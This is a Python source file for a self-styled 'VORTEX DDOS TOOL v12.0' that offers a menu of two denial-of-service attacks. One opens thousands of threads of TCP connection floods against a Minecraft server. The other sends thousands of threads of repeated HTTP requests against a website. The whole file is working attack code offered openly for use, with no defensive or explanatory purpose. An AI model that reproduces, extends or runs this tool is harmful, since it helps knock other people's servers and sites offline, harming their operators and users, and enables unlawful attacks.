#!/usr/bin/env python3
# VORTEX DDOS TOOL v12.0

import os
import sys

def clear_screen():
    os.system('clear')

def banner():
    print("""
╔════════════════════════════════════════════════════════════╗
║              VORTEX DDOS TOOL v12.0                       ║
║         Minecraft & Website DDoS Attacker                 ║
╚════════════════════════════════════════════════════════════╝
""")

def minecraft_attack():
    print("\n[ MINECRAFT ATTACK ]")
    target = input("IP or Domain: ")
    port = int(input("Port (25565): ") or 25565)
    threads = int(input("Threads (3000): ") or 3000)
    duration = int(input("Duration (60 sec): ") or 60)
    
    print(f"\n[!] Attacking {target}:{port} for {duration}s")
    print("[!] Press Ctrl+C to stop")
    
    import threading, socket, time
    stop = threading.Event()
    stats = {'p':0}
    
    def flood():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target, port))
                s.send(b"\x00"*64)
                s.close()
                stats['p'] += 1
            except: pass
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        print(f"\n[✓] Packets sent: {stats['p']}")

def website_attack():
    print("\n[ WEBSITE ATTACK ]")
    url = input("URL (https://example.com): ")
    threads = int(input("Threads (3000): ") or 3000)
    duration = int(input("Duration (60 sec): ") or 60)
    
    import threading, time, urllib.request
    stop = threading.Event()
    stats = {'r':0}
    
    def flood():
        while not stop.is_set():
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                urllib.request.urlopen(req, timeout=3)
                stats['r'] += 1
            except: pass
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        print(f"\n[✓] Requests sent: {stats['r']}")

def main():
    while True:
        clear_screen()
        banner()
        print("\n1. MINECRAFT SERVER DDoS")
        print("2. WEBSITE DDoS")
        print("3. EXIT")
        choice = input("\nSelect: ")
        
        if choice == "1":
            minecraft_attack()
        elif choice == "2":
            website_attack()
        elif choice == "3":
            sys.exit(0)
        input("\nPress Enter...")

if __name__ == "__main__":
    main()
